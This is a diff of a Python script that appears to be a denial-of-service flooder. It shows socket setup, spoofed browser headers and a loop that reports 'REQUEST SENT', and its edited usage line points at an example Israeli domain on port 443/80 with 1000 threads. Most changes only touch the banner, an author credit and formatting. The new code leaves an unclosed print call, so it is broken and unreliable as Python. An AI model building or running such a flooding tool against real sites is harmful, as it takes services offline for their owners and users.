@@ -22,20 +22,20 @@ print( """
                //,..,\\
            ====UU====UU==== 
               ///|||\\\
- █████═╗
- █ ╔═══╝
- █ ║
- █ ║
- █████═╗
- ╚═══█ ║
-        █ ║
- █████ ║
- ╚═════╝
+█████═╗
+█ ╔═══╝
+█ ║
+█ ║
+█████═╗
+╚═══█ ║
+       █ ║
+█████ ║
+╚═════╝
 ════════════════════════════════════════════════════════
 """)
 print(f"\033[33m╔{'═' * 70}╗\033[0m")
-print(f"\033[94m║{' ' * 45}v.1.0║\033[0m")
-print(f"\033[33m║{' ' * 10}Author By: KunFayz║\033[0m")
+print(f"\033[94m║v.1.0{' ' * 70}║\033[0m")
+print(f"\033[33m║Author By: KunFayz{' ' * 53}║\033[0m")
 print(f"\033[92m╚{'═'  * 70}╝\033[0m")
 regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                     "Accept-language: en-US,en,q=0.5"]
@@ -53,7 +53,7 @@ def init_socket(ip,port):
 
 def main():
     if len(sys.argv)<5:
-        print(("Usage: {} example.com Port Threads 2".format(sys.argv[0])))
+        print(("Usage: {} https//example.co.il 443/80 1000 2".format(sys.argv[0])))
         return
 
     ip = sys.argv[1]
@@ -74,7 +74,8 @@ def main():
     bar.finish()
 
     while True:
-        print(("\033[32m[÷]\033[31m▒▒\033[92m▒▒MORZE\033[33m▒▒REQUEST\033[31m▒▒SENT\033[37m▒::.".format(len(socket_list))))
+        print("\033[32m[÷]".format(len(socket_list)))
+        print(
 
         for s in socket_list:
             try:
